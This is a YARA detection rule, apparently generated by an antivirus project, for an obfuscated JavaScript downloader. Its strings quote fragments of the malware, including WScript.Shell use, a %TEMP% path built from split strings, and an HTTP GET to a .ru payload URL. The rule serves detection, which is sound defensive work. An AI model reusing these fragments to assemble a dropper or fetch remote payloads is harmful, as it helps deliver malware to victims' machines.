rule sig_20160427_0d417dc87cbefbbd2d61254d950ca1ff {
  meta:
    description = "datamaliciousorder - file 20160427_0d417dc87cbefbbd2d61254d950ca1ff.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "85c5e2ab9e370e98dd9d86a3d30c7868f7ca0c5a1cf36a15fd72a0766c6d4ba4"

  strings:
    $s1  = "function DugwaVqzaf() {return QkmpbIftbd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"irAO2Pb" ascii
    $s2  = "function DugwaVqzaf() {return QkmpbIftbd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"irAO2Pb" ascii
    $s3  = "var QkmpbIftbd = function OexciHbljw() {return MfhaaNhyrq[AlzgyQluxj](\"WScript\"+\".Shell\");}(), DzybmDvlet = 11;" fullword ascii
    $s4  = "function TgdbcWkvdx(UepxkTcrch, IunsoPigvh){JqynkHwduk = JqynkHwduk * 1; return UepxkTcrch - IunsoPigvh;};" fullword ascii
    $s5  = "MnxmbMeepy[JrzrrAcgly](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var MfhaaNhyrq = this[\"WScript\"];" fullword ascii
    $s7  = "if (MnxmbMeepy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function UbpngVlwgx(){return VpsnxLhgad + \"\";};" fullword ascii
    $s9  = "function NoixxLjvep() {return ((CzzcfFgqss == true) && (CzzcfFgqss == QabeoBhatz)) ? 1 : JqynkHwduk;};" fullword ascii
    $s10 = "function ZwvtqQmhbm(){return AlzgyQluxj;};" fullword ascii
    $s11 = "function BrzbqDgaea()" fullword ascii
    $s12 = "var SqoeoRopit = false;" fullword ascii
    $s13 = "QabeoBhatz = true; " fullword ascii
    $s14 = "}while (MpwwcUbwvi);" fullword ascii
    $s15 = "function QqvxdQahko(WkddmDntdm) {var FeadbXwujh = (1, 2, 3, 4, 5, WkddmDntdm); return FeadbXwujh;};" fullword ascii
    $s16 = "function ByxgtLuabi(){return 23;};" fullword ascii
    $s17 = "SqoeoRopit = true;" fullword ascii
    $s18 = "return TgdbcWkvdx(GbpgfTyaqe, GvmjnNxedx);" fullword ascii
    $s19 = "CzzcfFgqss = true; " fullword ascii
    $s20 = "var CzzcfFgqss = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}